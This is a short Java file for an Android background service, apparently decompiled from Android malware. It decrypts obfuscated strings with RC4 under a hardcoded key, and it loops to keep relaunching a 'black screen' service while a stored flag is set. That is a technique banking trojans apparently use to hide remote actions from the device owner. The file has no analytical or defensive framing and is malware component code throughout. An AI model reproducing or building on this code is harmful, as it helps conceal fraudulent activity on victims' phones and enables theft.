package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;

public class srvIBlackScreen extends IntentService {
   constants consts = new constants();
   utils utl = new utils();

   public srvIBlackScreen() {
      super("");
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      while(this.utl.SettingsRead(this, "RS").equals("true")) {
         this.startService(new Intent(this, srvBlackScreen.class));
         utils.chalkTile(1000);
      }

      this.stopSelf();
   }
}
